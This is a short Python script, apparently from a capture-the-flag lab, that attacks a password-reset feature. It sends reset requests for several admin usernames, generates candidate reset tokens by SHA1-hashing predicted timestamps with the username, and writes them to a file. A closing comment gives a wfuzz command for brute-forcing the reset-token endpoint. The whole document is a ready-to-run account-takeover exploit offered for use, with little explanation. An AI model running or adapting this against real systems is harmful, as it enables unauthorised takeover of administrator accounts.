#SERGEN
import requests
import hashlib
import datetime

usernames=['root','admin','administrator']
DIFF = datetime.timedelta(minutes=2)
#Correct username is administrator
for x in usernames:
	data={'username':x}
	requests.post('http://10.10.226.98/forgot_password',data=data) #Change ip address
	value=datetime.datetime.now(datetime.timezone.utc) + DIFF
	user1=x
	for i in range(10):
		time = str(value)[:-14]+str(i)+"."
		for i in range(100):
			if(i<10):
				lnk = time+"0"+str(i)+" . " + user1.upper()
				lnk = hashlib.sha1(lnk.encode("utf-8")).hexdigest()
				with open('administrator.out','a') as hashes:
					hashes.write(lnk+'\n')
				
			else:
				lnk = time+str(i)+" . " + user1.upper() 
				lnk = hashlib.sha1(lnk.encode("utf-8")).hexdigest()
				with open('administrator.out','a') as hashes:
					hashes.write(lnk+'\n')
				
				
print('Check administrator.out')

#You can use the hashes.txt as a token list for bruteforce attack.
#Example: wfuzz -u 'http://<ipaddr:port>/password_reset?token=FUZZ -w ./hashes.txt --hw 2


			
	
			